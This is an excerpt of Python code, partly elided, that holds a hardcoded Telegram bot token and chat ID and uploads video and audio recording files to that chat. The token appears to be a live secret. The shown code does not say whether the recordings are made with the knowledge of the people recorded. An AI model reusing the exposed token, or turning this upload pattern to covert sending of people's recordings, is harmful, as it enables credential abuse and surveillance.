...
# Telegram Settings
TELEGRAM_BOT_TOKEN = "8026534751:AAHbe-3bfxf2wncrpQ2egj-exu-XbzHnTj8"
TELEGRAM_CHAT_ID = "6187507969"
    ...
    try:
        with open(video_path, "rb") as f:
            response = requests.post(
                ...
                files={"video": f},
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": "تسجيل فيديو"}
            )
            if not response.ok:
                raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
    ...
    try:
        with open(audio_path, "rb") as f:
            response = requests.post(
                ...
                files={"audio": f},
                data={"chat_id": TELEGRAM_CHAT_ID, "caption": "تسجيل صوتي"}
            )
            if not response.ok:
                raise Exception(f"HTTP Error {response.status_code}: {response.text}")
    except Exception as e:
